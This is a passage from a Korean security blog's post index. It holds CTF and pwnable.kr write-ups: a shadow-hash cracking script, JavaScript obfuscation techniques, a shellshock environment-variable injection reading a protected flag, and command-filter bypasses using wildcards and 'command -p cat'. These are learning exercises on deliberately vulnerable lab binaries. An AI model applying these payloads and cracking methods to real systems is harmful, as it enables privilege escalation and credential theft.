c1edCFiKnPc42XxMRGsrNJn36mkc2dgH/:17930:0:99999:7:::s:$6$TXxh4vV5$v1vF49YZQnonSZrKwBWNp7rpxIRoQY/ooEODqjsdwwdoY8sso.y/EOsoC3GFlpCLYnEY./n/1BuNID5njg0CV.:17930:0:99999:7:::c:$6$IYxRoIyR$eEmGTNPNd6HPQibc/UBdQ5zgR/dGQ1dtCuSl0lUmvmbrSKbYEf/SEDlX4fgP.JQXlyFqEgu4NOBiu2eozpAM.0:17930:0:99999:7:::w:$6$RmCyBroe$EovezmWQJVvQFGd6.ei2.SfzGJG22CsV47tTnyfKx30TbuG1VMgsk0de6NOQ04bKNML9fbuMu0Pw3TMf82zye1:17930:0:99999:7:::d:$6$..CK41Sn$36X19X0jrviLxVVk.KtR9zbHMML0mg1XzMNQgP7eOpGMF1JYSbZHAyReDhNVkm1WaNn3lfO2CsAww14fZZads1:17930:0:99999:7:::t:$6$zVFV5HoW$q9WyP6/D0kPL.n7s.FvPcOSRfvcUFQu5QMPps6VbQUD5RMozQsP14GtUiOa/H2V2pU6c6OxcgRqruaLejPaES1:17930:0:99999:7:::h:$6$S1RnJ8DK$F/FWFf9En/mn6YqZ67/gOnMT0WdSuaEyn2OArTJbG1IGHd0pUs9TiGDE9P.PhRB6XyHUgA5l/LBmBW8PpJg9M.:17930:0:99999:7:::m:$6$SqkKQRak$nZHDrq3vdnajdLzotrW3J9kYzUvzPaUrs6NZaKkkcVN0KiCfUhJfgM6WJvZjZR7hBGWkfIwhZymko7wtsq49s1:17930:0:99999:7:::k:$6$ZLCr2itT$tZ0.u7TsXPc3nAntIOepETGkhqfVG1IKaiuW0mAH5QROVuc7fonE43qEhUFT2LHMftYDdTQRAMHpRNMM8Yn1c1:17930:0:99999:7:::i:$6$ZlWmheB2$DBLJQPLVhhEdA/iATrOYiqFv4i5TcmBUSX6.tZDo63YP4dcdlAuBnFU65xXIRP1tpNsCS7kc6Fu6jPMS2F7aP1:17930:0:99999:7:::y:$6$rIoO6U2u$c5usMXbFP9S75qmDyBBWz1QZuyGH0MGq3mXN32kYipoL5XCFEHjmTRVcuZkmed5OzAopV0CgyA49QzILz5Rmq/:17930:0:99999:7:::j:$6$Gpavrajq$me1yxZQ0OiJFedrTmxFsyP5zwOePuFJmgujUWun0h5bCOIVeuJuaIUTDHGCYxkT6mw41BTjlx9c3QvdsG8o0o.:17930:0:99999:7:::u:$6$0w3EeszD$bUDQorjCKku1sjtCWMQfJ3ZRmsC5N.LN7CQnjvyCbcq5wSD33x2t/TVXA6jnjtajv8nIZc.Aj.oY80lm44Dhy0:17930:0:99999:7:::underscore:$6$RVUCQJFr$fsKkPUT9Pp5QlsZblSLJ4yKkfBxNMWN0TS.q7ticuEr/HQFdEbyiwK5JmaKKS9UDFzUsY6mhe1knnRbwy7K0s/:17930:0:99999:7:::정확히 27줄이 남는 것을 보니 알파벳 소문자와 _가 모두 들어있는 것 같다.이 값들을 크랙해야 하는데, Hash는 단방향 암호화 기법이기 때문에 특정 단어로 hashing을 수행한 뒤, 그 값과 shadow.txt에 저장된 값이 같은지 비교하는 방법으로 크랙해야 한다.특정 단어가 무엇인지는 모르겠지만, shadow.txt 파일의 user에 알파벳 소문자와 underscore가 있다.때문에 알파벳 소문자와 _를 shadow.txt에 있는 salt 값과 함께 SHA512 hashing을 수행 해 비교하고, encrypted.txt에 있는 각 글자를 user로 하여 해당 user의 password로 변경하도록 아래와 같이 코드를 구현 해 보았다.import stringimport cryptdictionary = string.ascii_lowercase + \"_\"def findPass(encrypted):        salt = encrypted[:11]        for c in dictionary:                dict_enc = crypt.crypt(c, salt)                if dict_enc == encrypted:                        return cd = dict()f = open(\"shadow.txt\", \"r\")shadow = f.read().split(\"\\n\")[:-1]enc = \"hajjzvajvzqyaqbendzvajvqauzarlapjzrkybjzenzuvczjvastlj\"for s in shadow:        user, encrypted = s.split(\":\")[0], s.split(\":\")[1]        d[user] = findPass(encrypted)flag = \"VolgaCTF{\"for c in enc:        flag = flag + d[c]flag = flag + \"}\"print flag이를 수행한 결과 다음과 같이 flag를 얻을 수 있었다.$ python ex.py VolgaCTF{pass_hash_cracking_hashcat_always_lurks_in_the_shadows}FLAG : VolgaCTF{pass_hash_cracking_hashcat_always_lurks_in_the_shadows}",
        "url": "//ctf/2019/2019/04/08/shadow-cat-writeup.html"
      }
      ,
    
      "development-web-2019-03-10-js-obfuscation-html": {
        "title": "Javascript 난독화 기법",
        "tags": "Javascript, Obfuscation",
        "date": "March 10, 2019",
        "author": "",
        "category": "",
        "content": "요즘 난독화 된 Javascript를 자주 보게 되었다.그래서 Javascript의 난독화 기법을 몇 가지 정리 해 두려 한다.난독화 방법  eval() 사용eval는 문자열을 코드로 인식하게 해 주는 함수이다.eval(1+2)&gt; 3eval(\"alert(1)\")&gt; alert 창이 뜸때문에 이를 활용하여 코드를 분석하기 어렵게 만들기도 한다.var a = \"document.write('\\x4d\\x41\\x44\\x48\\x41\\x54')\";eval(a);위의 코드를 입력하면 아래와 같이 MADHAT이 출력되는 것을 확인할 수 있다.  Split두 번째 방법은 문자열을 다수의 변수에 나누어 적는 방법이다.이 후 다시 이 문자열을 합쳐 실행시킨다.var a = \"&lt;h\";var b = \"&lt;/h\";var c = \"M\";var d = \"1&gt;\";var e = \"AT\";var f = \"1&gt;\";var g = \"AD\";var h = \"H\";document.write(a + f + c + g + h + e + b + d);  Hexademical / Decimal 사용Hexademical은 16진수를, Decimal은 10진수를 의미한다.어떤 문자열이 있을 때, 이를 알아보기 어렵게 16진수 혹은 10진수 값으로 바꾸어 입력할 수 있다.이 때, String.fromCharCode 혹은 String.charCodeAt 함수를 사용할 수 있다.String.fromCharCode는 숫자를 문자로 변환하는 함수이고, String.charCodeAt은 특정 위치의 문자를 아스키코드의 숫자로 변환하는 함수이다.document.write('\\x4d\\x41\\x44\\x48\\x41\\x54\\x20');document.write(String.fromCharCode(0x4d,0x41,0x44,0x48,0x41,0x54,0x20));document.write(String.fromCharCode(77,65,68,72,65,84,32));document.write(String.fromCharCode(\"LADHAT\".charCodeAt(0) + 1));  escape / unescapeescape 함수는 ASCII 형태의 문자열을 ISO Latin-1 형태로 변환해 주는 함수이다.unescape 함수는 그와 반대로 반환 해 준다.알파벳과 숫자, *, @, -, _, +, / 를 제외한 특수문자만 해당된다.document.write(escape(\"MADHAT!@#$%^&amp;*\"));document.write(\" \");document.write(unescape(\"MADHAT%21@%23%24%25%5E%26*\"));  XOR, +, - 등 연산문자열을 알아보기 어렵게 하기 위해서 연산을 사용하기도 한다.특정 문자를 아스키코드의 숫자로 바꾼 후, XOR, +, - 등의 연산을 통해서 원래의 문자로 변경하는 것이다.document.write(String.fromCharCode(92 ^ 17, 80 ^ 17, 85 ^ 17, 89 ^ 17, 80 ^ 17, 69 ^ 17));이 외에도, 함수 명이나 변수 명을 _, __, ___ 등으로 만들어 구분을 어렵게 하거나, 알파벳이 아닌 문자를 사용하는 방법도 있다.또한 띄어쓰기를 없애 소스코드를 한 덩어리로 만들어 읽기 어렵게 만들기도 한다.Javascript 코드를 분석할 때 난독화가 되어있다면 매우 분석하기가 어렵다.때문에 난독화를 풀어서 분석하는 것이 효율성 측면에서 더 좋을 수 있다.내가 난독화 된 코드를 분석할 때 사용하는 방법을 몇 가지 정리 해 보면 다음과 같다.난독화 풀기  JS beautifier띄어쓰기가 안되어 소스코드가 뭉쳐있어 함수와 변수의 구분이 안되는 것은 JS beautifier를 사용하면 된다.위의 사이트에서 소스코드를 입력한 후, Beautify Code 버튼을 클릭하면 소스코드가 깔끔하게 정리되어 보인다.  텍스트 에디터함수 명이나 변수 명들이 _, __ 혹은 ll11, l1l1 와 같이 구분하기 어렵게 선언되어 있는 경우가 있다.이 경우에는 텍스트 에디터를 사용 해 해당 변수 및 함수의 이름을 적절히 바꾸어 분석하면 조금 더 수월하게 분석할 수 있다.  Chrome 개발자도구의 Console난독화 된 문자열은 손으로 하나하나 해석하려면 시간이 오래 걸린다.그런데 경험 상, 문자열을 난독화 한다면 String.fromCharCode 등의 함수가 사용되어 결국 원래의 문자로 복구시킨다.이 때, 복구 된 문자를 확인하기 위해서 Chrome 개발자도구의 Console을 사용하면 좀 더 수월하게 확인할 수 있다.예를 들어 아래와 같은 코드가 있다.var a = String.fromCharCode(92 ^ 17, 80 ^ 17, 85 ^ 17, 89 ^ 17, 80 ^ 17, 69 ^ 17);이 때, a의 값을 알기 위해서 Console창에 String.fromCharCode 부분을 입력 하면 복구된 문자열을 확인할 수 있다.지금 생각나는 것은 이정도인 것 같다.만약 앞으로 문제를 풀거나 분석을 하며 아이디어가 더 생긴다면 추가로 더 정리해두어야 겠다.",
        "url": "//development/web/2019/03/10/js-obfuscation.html"
      }
      ,
    
      "wargame-pwnable-kr-2019-02-14-pwnable-kr-lotto-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - lotto 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "February 14, 2019",
        "author": "",
        "category": "",
        "content": "오늘은 lotto 문제이다.사실 원래는 input을 풀려고 하다가 일단 lotto를 먼저 풀었다.문제 접속 정보는 아래와 같다.  ssh lotto@pwnable.kr -p2222 (pw:guest)문제에 접속하면 3개의 파일을 확인할 수 있다.  -r–r—–  1 lotto_pwn root     55 Feb 18  2015 flag-r-sr-x—  1 lotto_pwn lotto 13081 Feb 18  2015 lotto-r–r–r–  1 root      root   1713 Feb 18  2015 lotto.c다른 문제들이랑 동일하게 실행파일, 소스코드, flag 파일이 있다.lotto.c의 내용은 다음과 같다.#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play(){\t\tint i;\tprintf(\"Submit your 6 lotto bytes : \");\tfflush(stdout);\tint r;\tr = read(0, submit, 6);\tprintf(\"Lotto Start!\\n\");\t//sleep(1);\t// generate lotto numbers\tint fd = open(\"/dev/urandom\", O_RDONLY);\tif(fd==-1){\t\tprintf(\"error. tell admin\\n\");\t\texit(-1);\t}\tunsigned char lotto[6];\tif(read(fd, lotto, 6) != 6){\t\tprintf(\"error2. tell admin\\n\");\t\texit(-1);\t}\tfor(i=0; i&lt;6; i++){\t\tlotto[i] = (lotto[i] % 45) + 1;\t\t// 1 ~ 45\t}\tclose(fd);\t\t// calculate lotto score\tint match = 0, j = 0;\tfor(i=0; i&lt;6; i++){\t\tfor(j=0; j&lt;6; j++){\t\t\tif(lotto[i] == submit[j]){\t\t\t\tmatch++;\t\t\t}\t\t}\t}\t// win!\tif(match == 6){\t\tsystem(\"/bin/cat flag\");\t}\telse{\t\tprintf(\"bad luck...\\n\");\t}}void help(){\tprintf(\"- nLotto Rule -\\n\");\tprintf(\"nlotto is consisted with 6 random natural numbers less than 46\\n\");\tprintf(\"your goal is to match lotto numbers as many as you can\\n\");\tprintf(\"if you win lottery for *1st place*, you will get reward\\n\");\tprintf(\"for more details, follow the link below\\n\");\tprintf(\"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n\");\tprintf(\"mathematical chance to win this game is known to be 1/8145060.\\n\");}int main(int argc, char* argv[]){\t// menu\tunsigned int menu;\twhile(1){\t\tprintf(\"- Select Menu -\\n\");\t\tprintf(\"1. Play Lotto\\n\");\t\tprintf(\"2. Help\\n\");\t\tprintf(\"3. Exit\\n\");\t\tscanf(\"%d\", &amp;menu);\t\tswitch(menu){\t\t\tcase 1:\t\t\t\tplay();\t\t\t\tbreak;\t\t\tcase 2:\t\t\t\thelp();\t\t\t\tbreak;\t\t\tcase 3:\t\t\t\tprintf(\"bye\\n\");\t\t\t\treturn 0;\t\t\tdefault:\t\t\t\tprintf(\"invalid menu\\n\");\t\t\t\tbreak;\t\t}\t}\treturn 0;}먼저 프로그램을 실행하면 메뉴가 3개가 있다.1을 선택하면 로또 맞추기 게임을 할 수 있고, 2를 선택하면 문제 풀이 방법을, 3을 선택하면 프로그램을 종료시킨다.2번을 선택했을 때 호출하는 help() 함수는 printf()로 문자열만을 출력한다.그래서 1을 선택했을 때 호출하는 play() 함수를 살펴보았다.void play(){\t\tint i;\tprintf(\"Submit your 6 lotto bytes : \");\tfflush(stdout);\tint r;\tr = read(0, submit, 6);\tprintf(\"Lotto Start!\\n\");\t//sleep(1);\t// generate lotto numbers\tint fd = open(\"/dev/urandom\", O_RDONLY);\tif(fd==-1){\t\tprintf(\"error. tell admin\\n\");\t\texit(-1);\t}\tunsigned char lotto[6];\tif(read(fd, lotto, 6) != 6){\t\tprintf(\"error2. tell admin\\n\");\t\texit(-1);\t}\tfor(i=0; i&lt;6; i++){\t\tlotto[i] = (lotto[i] % 45) + 1;\t\t// 1 ~ 45\t}\tclose(fd);\t\t// calculate lotto score\tint match = 0, j = 0;\tfor(i=0; i&lt;6; i++){\t\tfor(j=0; j&lt;6; j++){\t\t\tif(lotto[i] == submit[j]){\t\t\t\tmatch++;\t\t\t}\t\t}\t}\t// win!\tif(match == 6){\t\tsystem(\"/bin/cat flag\");\t}\telse{\t\tprintf(\"bad luck...\\n\");\t}}먼저 read() 함수를 통해 표준 입력으로 6 byte를 입력 받아 submit에 저장한다.이 때, submit 변수는 char 형 변수이기 때문에 문자 형태로 저장된다.이 후 fd를 저장한 후 해당 fd에서 다시 6 byte를 입력 받아 lotto 변수에 저장한다.lotto 변수 또한 char 형 이며, 1 ~ 45 사이의 값을 가지도록 하기 위해 (lotto[i] % 45) + 1의 수식을 통해 연산을 한다.마지막으로 만약 submit과 lotto의 각 자리를 비교 해 값이 같다면 match++을 하고, 이 match의 값이 6이라면 /bin/cat flag를 실행시켜 플래그를 읽을 수 있게 된다.난 처음에 fd 부분에 초점을 맞췄었다.그런데 테스트 해 본 결과 fd의 값은 3이 나왔는데, 어떻게 해도 fd가 3일 때 입력 줄 수 있는 방법을 찾을 수가 없었다. ㅠㅠ그래서 다시 lotto와 submit을 비교하는 부분을 살펴봤는데, 내가 바보였다…소스코드를 다시 살펴보면 다음과 같다.\tint match = 0, j = 0;\tfor(i=0; i&lt;6; i++){\t\tfor(j=0; j&lt;6; j++){\t\t\tif(lotto[i] == submit[j]){\t\t\t\tmatch++;\t\t\t}\t\t}\t}for 문을 2번 실행하는데, 이 때 비교하는 부분을 예외처리를 하지 않아 반복문이 무조건 36번을 돌게 되어있다.그렇다면 같은 값으로 6 byte를 입력하고, 만약 lotto에 저장된 값이 하나라도 내가 입력 한 문자와 같다면 match가 6이 되어 문제를 풀 수 있을 것이다.한 가지 더 생각해야하는 부분이 있다.submit과 lotto 변수는 char 형 변수이다.때문에 숫자를 입력하더라도 char형으로 저장되기 때문에 0 ~ 9 사이의 숫자를 입력한다면 이 값은 각각 아스키코드 값으로 48 ~ 57이 되기 때문에 lotto의 범위인 1 ~ 45 사이에 값이 되지 않는다.때문에 아스키코드의 10진수 값 중 1 ~ 45 사이의 문자 중 출력 가능 한 문자를 찾아 submit의 값으로 입력 해 주어야 lotto와 비교를 했을 때 같은 값이 나올 수 있다.33 ~ 45까지가 출력 가능하며 문자로는 !\"#$%&amp;'()*+,-이 된다.그래서 이 문자 중 아무거나 한개를 정해서 6개를 계속 입력 해 보았다.그러면 언젠가는 lotto에 저장된 값 중 한개가 내가 입력 한 값과 동일하게 될 것이고, 그렇다면 36번의 반복문에 의해 match의 값이 6이 되며 문제를 풀 수 있을 것이다.나는 #을 선택 해 입력 해 보았다.그 결과 무려 13번 만에 플래그를 얻을 수 있었다.lotto@ubuntu:~$ ./lotto- Select Menu -1. Play Lotto2. Help3. Exit1Submit your 6 lotto bytes : ######Lotto Start!sorry mom... I FORGOT to check duplicate numbers... :(FLAG : sorry mom... I FORGOT to check duplicate numbers... :(",
        "url": "//wargame/pwnable.kr/2019/02/14/pwnable.kr-lotto.html"
      }
      ,
    
      "wargame-pwnable-kr-2019-02-13-pwnable-kr-shellshock-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - shellshock 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "February 13, 2019",
        "author": "",
        "category": "",
        "content": "밤에 바로 잘까 하다가 갑자기 1pt 짜리 shellshcok 문제가 있었다는 것이 생각나 후딱 풀어보았다.예전에 CTF에서 나왔던 걸 풀어봐서인지 금방 풀 수 있었다.문제 접속 정보는 아래와 같다.  ssh shellshock@pwnable.kr -p2222 (pw:guest)문제에 접속하면 4개의 파일을 확인할 수 있다.  -r-xr-xr-x  1 root shellshock     959120 Oct 12  2014 bash-r–r—–  1 root shellshock_pwn     47 Oct 12  2014 flag-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock-r–r–r–  1 root root              188 Oct 12  2014 shellshock.c다른 문제들이랑 동일하게 실행파일, 소스코드, flag 파일이 있고, 이번에는 추가적으로 bash가 있다.shellshock.c의 내용은 다음과 같다.int main(){\tsetresuid(getegid(), getegid(), getegid());\tsetresgid(getegid(), getegid(), getegid());\tsystem(\"/home/shellshock/bash -c 'echo shock_me'\");\treturn 0;}소스코드가 굉장히 짧다.다른 문제들에 비해 비교적 간단한데 이 중 주의깊게 봐야 할 부분은 system() 함수를 호출하는 부분이다.system() 함수를 호출 해 /home/shellshock/bash -c 'echo shock_me를 실행시킨다.즉 현재 디렉토리에 있는 bash를 통해 echo shock_me를 실행시키는 것이다.shellshock 취약점은 하도 유명한 취약점이라 한번쯤은 이름이라도 들어봤을 것 같다.그래서 현재 디렉토리에 있는 bash가 shellshock 취약점을 사용할 수 있는 버전인지 확인을 해 보았다.먼저 그냥 bash의 버전을 확인 해 보면 4.3.48로 shellshock 취약점에 취약한 버전이 아니다.shellshock@ubuntu:~$ bash --versionGNU bash, version 4.3.48(1)-release (x86_64-pc-linux-gnu)Copyright (C) 2013 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software; you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.하지만 현재 디렉토리에 있는 bash의 버전은 4.2.25로 shellshock에 취약하다.shellshock@ubuntu:~$ ./bash --versionGNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)Copyright (C) 2011 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software; you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.그렇다면 shellshock.c에서 shellshock 취약점을 사용할 수 있는 현재 디렉토리의 bash를 사용 해 특정 명령어를 실행하니, shellshock 취약점을 사용 해 flag를 읽으면 될 것 같다.일단 shellshock 취약점을 테스트 해 볼 수 있는 방법은 다음과 같다.$ ​$ env x='() { :; }; echo test' bash -c \"echo test2\"testtest2특정 환경변수에 위와 같이 값을 입력한 후, shellshock에 취약한 bash를 실행시키면 함수의 종료부인 ; 뒤의 추가적인 명령어 (위의 예시에서는 echo test)가 실행되는 것이다.(echo test2가 출력되는 이유는 새로운 bash를 이용 해 echo test2 명령어를 실행시켰기 때문이다.)처음에는 이게 왜 실행되는지 잘 이해가 되지 않았다.그래서 더 찾아보다가 취약점의 원인에 대해 잘 잘 설명한 블로그 글을 찾았다.Shellshock 설명 블로그위의 블로그에 따르면, bash process가 동작하는 순서는 다음과 같다.1. bash 실행2. bash 환경변수 초기화3. bash shell prompt 출력4. 명령어 대기5. (명령어 수행할 경우) 명령어를 문자열로 저장 해 해당 문자열 파싱6. 파싱 된 구초제를 이용 해 명령어 수행이 때, shellshock 취약점은 2번 과정에서 발생한다.환경변수를 초기화 할 때 함수의 종료를 의미하는 ;를 끝으로 더 이상 인식하지 말아야하는데 이를 제대로 파악하지 못해 그 뒤의 명령어가 실행되는 취약점이다.다른 예를 들어 설명하면, export x='() { echo test; }; echo test2'에서 export x='() { echo test; };만을 환경변수 x의 값으로 넣어, x 실행 시 echo test가 나오도록 하고 나머지 부분은 무시하거나 따로 처리하도록 해야 하는데, ; 뒤의 echo test2를 명령어로 인식하여 새로운 bash 실행 시 echo test2가 실행되는 것이다.이를 테스트 해 보면 다음과 같다.shellshock@ubuntu:~$ export x='() { echo test; }; echo test2'shellshock@ubuntu:~$ ./bashtest2shellshock@ubuntu:~$ xtest원래의 bash에서 x 환경변수를 등록한 후 취약한 버전의 bash를 실행하면 자동으로 echo test2가 실행된다.새로운 bash가 실행되며 x 환경변수는 초기화 되었으므로 x의 값은 새로운 bash에서 echo test를 실행하는 함수로 설정되어 있어, x 실행 시 echo test가 실행된다.그렇다면 문제로 돌아가서, shellshock.c 코드에서는 취약한 버전의 bash를 새로 실행한다.또한 권한을 확인 해 보았을 때 shellshock 실행파일에 SetUID가 걸려있으므로, 해당 실행 파일의 권한을 이용 해 bash를 실행한다면, flag 또한 읽을 수 있다.그래서 x라는 이름으로 아래와 같은 환경변수를 등록했다.shellshock@ubuntu:~$ export x='() { echo test; }; /bin/cat flag'그러면 shellshock 실행파일에서 system(\"/home/shellshock/bash -c 'echo shock_me'\");를 실행하며 새로운 bash를 실행시킬 것이며, 이 때 환경변수를 초기화 하며 x는 echo test를 실행하는 함수가 저장 될 것이다.또한 ; 뒤의 /bin/cat flag 명령어를 실행하게 될 것이다.이 후 shellshock를 실행 해 본 결과 아래와 같이 플래그를 얻을 수 있었다. ㅎㅎshellshock@ubuntu:~$ export x='() { echo test; }; /bin/cat flag'shellshock@ubuntu:~$ ./shellshock only if I knew CVE-2014-6271 ten years ago..!!Segmentation faultFLAG : only if I knew CVE-2014-6271 ten years ago..!!",
        "url": "//wargame/pwnable.kr/2019/02/13/pwnable.kr-shellshock.html"
      }
      ,
    
      "wargame-pwnable-kr-2019-02-12-pwnable-kr-cmd2-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - cmd2 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "February 12, 2019",
        "author": "",
        "category": "",
        "content": "이번에는 바로 cmd2 문제를 풀어보았다.별로 안걸릴 줄 알았는데 생각보다 생각을 오래하게 하는 문제였다.문제 접속 정보는 아래와 같다.  ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)문제에 접속하면 3개의 파일을 확인할 수 있다.  -r-xr-sr-x  1 root cmd2_pwn 8794 Dec 21  2015 cmd2-rw-r–r–  1 root root      586 Dec 21  2015 cmd2.c-r–r—–  1 root cmd2_pwn   30 Jul 14  2015 flag다른 문제들이랑 동일하게 실행파일, 소스코드, flag 파일이 있다.cmd2.c의 내용은 다음과 같다.#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd){\tint r=0;\tr += strstr(cmd, \"=\")!=0;\tr += strstr(cmd, \"PATH\")!=0;\tr += strstr(cmd, \"export\")!=0;\tr += strstr(cmd, \"/\")!=0;\tr += strstr(cmd, \"`\")!=0;\tr += strstr(cmd, \"flag\")!=0;\treturn r;}extern char** environ;void delete_env(){\tchar** p;\tfor(p=environ; *p; p++)\tmemset(*p, 0, strlen(*p));}int main(int argc, char* argv[], char** envp){\tdelete_env();\tputenv(\"PATH=/no_command_execution_until_you_become_a_hacker\");\tif(filter(argv[1])) return 0;\tprintf(\"%s\\n\", argv[1]);\tsystem( argv[1] );\treturn 0;}cmd1 문제의 소스코드와 거의 유사 해 보이는데, 이번에는 delete_env() 함수가 추가되었고, filter() 함수에 필터링 하는 문자도 추가되었다.delete_env() 함수는 환경변수를 memset() 함수를 통해 완전히 초기화 시키는 함수이다.filter() 함수의 역할은 앞의 cmd1과 동일하지만 이번에는 필터링 하는 문자가 조금 바뀌었다.가장 중요한 부분은 /가 필터링 되었기 때문에 /bin/cat을 사용할 수 없다는 것이다.일단 /bin을 사용할 수 없는 것은 ~가 홈 디렉토리를 의미하기 때문에, ~bin으로 대체할 수 있다.또한 flag는 앞의 cmd1과 같이 f***로 사용할 수 있다.여기서 문제는 /bin/cat을 어떻게 필터링에 걸리지 않고 실행할 수 있느냐 이다.한참을 인터넷을 뒤지다가 command 라는 명령어를 찾게 되었다.설명을 살펴보면 다음과 같다.$ help commandcommand: command [-pVv] command [arg ...]    Execute a simple command or display information about commands.        Runs COMMAND with ARGS suppressing  shell function lookup, or display    information about the specified COMMANDs.  Can be used to invoke commands    on disk when a function with the same name exists.        Options:      -p\tuse a default value for PATH that is guaranteed to find all of    \tthe standard utilities      -v\tprint a description of COMMAND similar to the `type' builtin      -V\tprint a more verbose description of each COMMAND        Exit Status:    Returns exit status of COMMAND, or failure if COMMAND is not found.여기서 -p 옵션을 확인하면 use a default value for PATH that is guaranteed to find all of the standard utilities라고 적혀있는 것을 확인할 수 있다.즉, command -p COMMAND를 입력하면 default PATH로 해당 명령어로 실행한다는 것이다.그렇다면 command -p cat FILENAME을 쉘에서 입력하면 아무리 PATH가 변경되어 있더라도 default PATH를 사용하기 때문에 정상적으로 cat 명령어가 실행 될 것이다.그래서 쉘에서 command -p cat flag를 실행 해 보았다.cmd2@ubuntu:~$ command -p cat flagcat: flag: Permission deniedPermission denied가 나오며 cat 명령어가 정상적으로 실행되었다!이에 이를 ./cmd2의 첫 번째 인자로 넣어주었다.물론 flag는 필터링 되어 있기 때문에 f***로 바꾸어 주었다.그 결과 아래와 같이 flag를 읽을 수 있었다!cmd2@ubuntu:~$ ./cmd2 \"command -p cat f***\"command -p cat f***FuN_w1th_5h3ll_v4riabl3s_hahaFLAG : FuN_w1th_5h3ll_v4riabl3s_haha",
        "url": "//wargame/pwnable.kr/2019/02/12/pwnable.kr-cmd2.html"
      }
      ,
    
      "wargame-pwnable-kr-2019-02-11-pwnable-kr-cmd1-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - cmd1 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "February 11, 2019",
        "author": "",
        "category": "",
        "content": "오랜만의 pwnable.kr이다.원래는 uaf를 풀고 싶었는데 일단 cmd1이 쉬워보여서 먼저 풀게 되었다.문제 접속 정보는 아래와 같다.  ssh cmd1@pwnable.kr -p2222 (pw:guest)문제에 접속하면 3개의 파일을 확인할 수 있다.  -r-xr-sr-x  1 root cmd1_pwn 8513 Jul 14  2015 cmd1-rw-r–r–  1 root root      320 Mar 23  2018 cmd1.c-r–r—–  1 root cmd1_pwn   48 Jul 14  2015 flag다른 문제들이랑 동일하게 실행파일, 소스코드, flag 파일이 있다.cmd1.c의 내용은 다음과 같다.#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd){\tint r=0;\tr += strstr(cmd, \"flag\")!=0;\tr += strstr(cmd, \"sh\")!=0;\tr += strstr(cmd, \"tmp\")!=0;\treturn r;}int main(int argc, char* argv[], char** envp){\tputenv(\"PATH=/thankyouverymuch\");\tif(filter(argv[1])) return 0;\tsystem( argv[1] );\treturn 0;}소스코드는 상당히 간단하다.putenv를 통해 PATH를 설정하고, 첫 번째 인자를 filter 함수를 통해 검사한다.만약 이 filter 함수를 통과하면 첫 번째 인자를 그대로 system 함수에 넣어 실행시켜 준다.그렇다면 간단하게 첫 번째 인자를 cat flag를 하면 될 것 같다.그런데 filter 함수를 살펴보면, 인자를 flag, sh, tmp와 비교해서 만약 그 값이 같다면 r의 값에 1을 더해준다.이 후 이 r을 반환한다.즉, 첫 번째 인자에 flag, sh, tmp라는 문자열이 포함된다면 r은 0이 아닌 수가 될 것이고, 그렇다면 if(filter(argv[1]))이 참이 되어 프로그램이 종료된다.따라서 문제를 풀기 위해서는 flag, sh, tmp라는 문자열을 포함하지 않고 cat flag를 실행시켜야 한다.그러다 발견한 것이 와일드카드이다.리눅스 환경에서 *은 모든 문자를 의미한다.때문에 cat cmd1.*이라고 하면 cmd1. 이후에 어떠한 문자가 붙는 모든 파일을 cat 명령어를 통해 읽을 수 있게 된다.그렇다면 같은 원리로 cat f***이라고 하면 현재 디렉토리에 f로 시작하는 4글자 파일은 flag밖에 없으니 flag 파일을 읽어 줄 것이다.또한 flag, sh, tmp가 포함되지 않으니 필터링도 통과할 수 있다.그런데 한가지 더 생각해야 하는 부분이 있는데 바로 putenv(\"PATH=/thankyouverymuch\");이다.현재 PATH라는 환경 변수를 확인 해 보면 아래와 같다.cmd1@ubuntu:~$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesPATH 환경 변수는 실행 파일을 찾는 경로를 저장한다.만약 내가 cat이라는 명령어를 입력하면 순서대로 /usr/local/sbin, /usr/local/bin 순으로 cat 이라는 명령어가 존재하는지 찾는다.cat 명령어는 /bin 디렉토리에 저장되어 있기 때문에 내가 굳이 /bin/cat이라고 입력하지 않아도 PATH에서 찾아주기 때문에 cat을 입력하는 것 만으로 사용할 수 있게 되는 것이다.때문에 root 사용자와 일반 사용자가 모두 아무 위치에서나 cat 만으로 사용할 수 있다.하지만 이 문제에서는 PATH라는 환경변수를 /thankyouverymuch로 바꾸기 때문에 /bin에 저장되어 있는 cat 명령어를 찾을 수 없다.따라서 /bin/cat이라고 절대 경로를 입력 해 주어야 cat 명령어를 실행할 수 있다.이를 토대로 문제를 풀기 위해 /***/cat f***을 첫 번째 인자로 전달 해 주었다.그 결과 flag 파일을 읽을 수 있었다.사실 /bin/cat f***라고 전달 해 주어도 필터링에 걸리지 않는다.그런데 그냥 해보고 싶었다 ㅎㅎcmd1@ubuntu:~$ ./cmd1 \"/***/cat f***\"mommy now I get what PATH environment is for :)FLAG : mommy now I get what PATH environment is for :)",
        "url": "//wargame/pwnable.kr/2019/02/11/pwnable.kr-cmd1.html"
      }
      ,
    
      "wargame-wargame-kr-2019-02-08-wargame-kr-db-is-really-good-html": {
        "title": "[Wargame.kr] DB is really GOOD 문제풀이",
        "tags": "Write-up, Wargame.kr",
        "date": "February 8, 2019",
        "author": "",
        "category": "",
